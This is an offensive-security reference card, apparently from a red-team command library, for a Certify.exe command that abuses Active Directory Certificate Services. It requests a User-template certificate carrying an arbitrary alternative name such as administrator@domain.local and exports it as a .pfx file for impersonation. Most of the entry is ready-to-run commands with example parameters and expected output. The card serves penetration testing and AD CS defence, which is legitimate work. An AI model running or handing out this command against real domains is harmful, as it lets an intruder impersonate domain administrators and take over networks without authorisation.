---
type: command
executor: powershell
data: '.\Certify.exe request /ca:$_CA_NAME /template:User /altname:$_ALTNAME'
tags:
  - adcs
  - exploitation
platforms:
  - Windows
verified: true
validated: true
---

# certify-request-user-cert-with-altname

## Command

```powershell
.\Certify.exe request /ca:$_CA_NAME /template:User /altname:$_ALTNAME
```

## Description

This command requests a certificate from the specified AD CS using the User template, embedding a custom alternative name (e.g., a privileged UPN) in the SAN extension if the CA allows it. It exports the result as a .pfx file for use in authentication impersonation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /ca:$_CA_NAME | Path to the Certificate Authority (e.g., dc.domain.local\\domain-DC-CA) | Yes |
| /template:User | Specifies the User certificate template | Yes |
| /altname:$_ALTNAME | Alternative name to add to SAN (e.g., administrator@domain.local) | Yes |
| request | Action to submit the CSR | Yes (built-in flag) |

## Examples

### Basic Usage

```powershell
.\Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:User /altname:administrator@domain.local
```

### Advanced Usage

With output to specific file:
```powershell
.\Certify.exe request /ca:$_CA_NAME /template:User /altname:$_ALTNAME /outfile:impersonation.pfx
```

## Expected Output

```
[*] Action: Requesting Certificate

[*] Template: User
[*] Alternative Name: administrator@domain.local

[*] Certificate requested successfully
[*] Exported public/private key to: user_cert.pfx
[*] PFX Password: TempPass123!
```

## Related

- [[procedures/Request-Alternative-Name-Certificate-via-AD-CS]]
- [[tools/Certify]]
